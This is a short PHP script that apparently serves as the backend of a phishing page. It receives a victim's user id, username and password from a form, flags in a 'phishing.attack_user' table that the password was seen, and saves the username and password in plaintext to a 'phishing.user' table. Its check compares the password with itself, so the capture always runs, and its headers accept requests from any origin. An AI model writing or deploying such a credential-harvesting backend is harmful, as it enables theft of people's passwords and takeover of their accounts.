<?php
require_once '../dbconexion.php';


header('Access-Control-Allow-Origin: *');
header("Access-Control-Allow-Headers: X-API-KEY, Origin, X-Requested-With, Content-Type, Accept, Access-Control-Request-Method");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE");
header("Allow: GET, POST, OPTIONS, PUT, DELETE");



$id = $_POST['uid'];
$user = $_POST['user'];
$pass = $_POST['contraseña'];

if($_POST['contraseña'] == $pass) {
    $passw = 1;

    $click = "UPDATE phishing.attack_user SET password_seen=? WHERE user_uid=?";
    $conexion->prepare($click)->execute([$passw, $id]);

    $click1 = "UPDATE phishing.user SET password=?, username=? WHERE uid=?";
    $conexion->prepare($click1)->execute([$pass, $user, $id]);
    }
else
    echo 'No se lleno';
?>